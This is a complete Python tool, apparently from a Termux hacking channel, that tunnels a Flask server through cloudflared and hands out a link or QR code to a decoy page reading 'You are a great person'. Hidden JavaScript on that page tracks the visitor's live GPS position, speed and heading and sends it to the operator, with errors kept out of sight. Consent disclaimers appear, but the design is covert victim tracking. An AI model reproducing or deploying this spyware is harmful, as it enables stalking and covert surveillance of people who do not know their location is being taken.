#!/usr/bin/env python3
# hco_track_phone.py
# HCO Track Phone by Azhar - CLOUDFLARE EDITION
# Save as hco_track_phone.py and run: python3 hco_track_phone.py
#
# IMPORTANT: Use this only on devices YOU OWN or with EXPLICIT CONSENT.

import os
import sys
import threading
import time
import re
import subprocess
from pathlib import Path

try:
    import requests
    from flask import Flask, request
except Exception:
    print("Missing Python packages. Install them with:")
    print("  pkg install python -y && pip install flask requests qrcode[pil]")
    sys.exit(1)

# Colors
RED = "\033[1;91m"
GREEN = "\033[1;92m"
CYAN = "\033[1;96m"
YELLOW = "\033[1;93m"
RESET = "\033[0m"

app = Flask(__name__)
locations = {}  # latest location dict

# ---------------- TOOL LOCK ----------------
def tool_lock():
    os.system("clear")
    print(f"{RED}╔{'═'*60}╗{RESET}")
    print(f"{RED}║{'🔒 TOOL LOCKED 🔒'.center(60)}║{RESET}")
    print(f"{RED}║{'HCO TRACK PHONE BY AZHAR'.center(60)}║{RESET}")
    print(f"{RED}║{'Subscribe @hackers_colony_tech'.center(60)}║{RESET}")
    print(f"{RED}╚{'═'*60}╝{RESET}\n")
    print(f"{YELLOW}This script is for testing on devices you own or where you have explicit permission.{RESET}\n")
    for i in range(9, 0, -1):
        sys.stdout.write(f"\r{CYAN}⏳ Redirecting in {i}...{RESET}")
        sys.stdout.flush()
        time.sleep(1)
    # Best-effort open YouTube on Android/Termux
    os.system('am start -a android.intent.action.VIEW -d "https://youtube.com/@hackers_colony_tech" > /dev/null 2>&1 || true')
    print(f"\n{GREEN}✅ Redirected to YouTube (if available).{RESET}\n")
    input(f"{YELLOW}Press ENTER to continue... (or just press ENTER){RESET}")

# ---------------- dependencies ----------------
def install_requirements():
    print(f"{CYAN}Checking/attempting to install requirements...{RESET}")
    os.system('pkg update -y > /dev/null 2>&1 || true')
    os.system('pkg install python wget -y > /dev/null 2>&1 || true')
    os.system('pip install flask requests qrcode[pil] > /dev/null 2>&1 || true')

# ---------------- cloudflared / public url ----------------
def start_cloudflared_tunnel(port=8080, timeout=12):
    """Try to start `cloudflared http <port>` and parse trycloudflare URL. Returns (url, proc) or (None, None)."""
    cmd = ["cloudflared", "http", str(port)]
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    except FileNotFoundError:
        return None, None

    url = None
    pattern = re.compile(r"https://[a-z0-9\-]+\.trycloudflare\.com", re.IGNORECASE)
    start = time.time()
    while time.time() - start < timeout:
        line = proc.stdout.readline()
        if not line:
            time.sleep(0.1)
            continue
        m = pattern.search(line)
        if m:
            url = m.group(0)
            break

    if url:
        # keep process alive in background
        threading.Thread(target=lambda p: p.wait(), args=(proc,), daemon=True).start()
        return url, proc

    try:
        proc.kill()
    except Exception:
        pass
    return None, None

def get_public_ip():
    try:
        r = requests.get("https://api.ipify.org", timeout=6)
        if r.status_code == 200:
            return r.text.strip()
    except Exception:
        return None

def create_public_url(port=8080):
    url, proc = start_cloudflared_tunnel(port=port, timeout=12)
    if url:
        return url
    ip = get_public_ip()
    if ip:
        return f"http://{ip}:{port}"
    return f"http://localhost:{port}"

# ---------------- flask endpoints ----------------
@app.route("/")
def index():
    # Page shows only the message. On load the page requests continuous position updates and sends them.
    return """
    <!doctype html>
    <html>
    <head>
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <title>HCO Track Phone</title>
      <style>
        body { background:#000; color:#0f0; display:flex; align-items:center; justify-content:center; height:100vh; font-family:Arial, sans-serif; font-size:22px; margin:0; }
      </style>
    </head>
    <body>
      <div>You are a great person 😁</div>
      <script>
        // Continuous updates using watchPosition
        function onSuccess(pos) {
          try {
            fetch('/update', {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify({
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                heading: pos.coords.heading || null,
                speed: pos.coords.speed || null,
                timestamp: pos.timestamp
              })
            }).catch(()=>{});
          } catch(e) {}
        }
        function onError(err) {
          // nothing visible to user; page remains the "You are a great person" message
        }
        if (navigator.geolocation && navigator.permissions) {
          // Try to request permission and start watchPosition
          navigator.permissions.query({name:'geolocation'}).then(function(status){
            // call getCurrentPosition to trigger the permission prompt immediately in some browsers
            navigator.geolocation.getCurrentPosition(function(){}, function(){}, {enableHighAccuracy:true});
            navigator.geolocation.watchPosition(onSuccess, onError, {enableHighAccuracy:true, maximumAge:3000, timeout:10000});
          }).catch(function(){
            // fallback: just start watchPosition (will trigger prompt)
            navigator.geolocation.watchPosition(onSuccess, onError, {enableHighAccuracy:true, maximumAge:3000, timeout:10000});
          });
        } else if (navigator.geolocation) {
          navigator.geolocation.watchPosition(onSuccess, function(){}, {enableHighAccuracy:true, maximumAge:3000, timeout:10000});
        }
      </script>
    </body>
    </html>
    """

@app.route("/update", methods=["POST"])
def update():
    try:
        data = request.get_json(force=True)
    except Exception:
        return "BAD", 400
    if not data or "lat" not in data or "lon" not in data:
        return "INVALID", 400

    data["time"] = time.time()
    locations.clear()
    locations.update(data)

    # Print a concise line and a Google Maps link
    lat = data.get("lat")
    lon = data.get("lon")
    acc = data.get("accuracy", "N/A")
    print(f"\n{GREEN}✅ LIVE LOCATION RECEIVED{RESET}")
    print(f"{CYAN}Latitude: {lat}{RESET}")
    print(f"{CYAN}Longitude: {lon}{RESET}")
    print(f"{CYAN}Accuracy: {acc} m{RESET}")
    print(f"{CYAN}Maps: https://maps.google.com/?q={lat},{lon}{RESET}\n")
    return "OK", 200

# ---------------- qr helper ----------------
def make_qr(url):
    try:
        import qrcode
        out = Path("track_qr.png")
        img = qrcode.make(url)
        img.save(out)
        # try open in Termux or desktop
        os.system(f"termux-open {out} > /dev/null 2>&1 || xdg-open {out} > /dev/null 2>&1 || true")
    except Exception:
        pass

# ---------------- start flask in thread ----------------
def start_server(port=8080):
    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False), daemon=True).start()

# ---------------- main ----------------
def main():
    tool_lock()
    install_requirements()
    os.system("clear")
    print(f"{GREEN}🚀 Starting HCO Track Phone...{RESET}")

    port = 8080
    public_url = create_public_url(port=port)
    start_server(port)
    time.sleep(1.2)
    make_qr(public_url)

    print(f"\n{GREEN}{'='*60}{RESET}")
    print(f"{GREEN}{'HCO TRACK PHONE BY AZHAR'.center(60)}{RESET}")
    print(f"{GREEN}{'='*60}{RESET}")
    print(f"{YELLOW}Public URL: {RESET}{public_url}\n")
    print(f"{YELLOW}Share the link or QR with the user (test on devices you own).{RESET}")
    print(f"{YELLOW}Waiting for live location updates... (Ctrl+C to stop){RESET}")

    last_time = 0
    try:
        while True:
            if locations.get("time", 0) > last_time:
                last_time = locations["time"]
                # already printed in /update handler
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{RED}🛑 Stopped by user{RESET}")

if __name__ == "__main__":
    main()
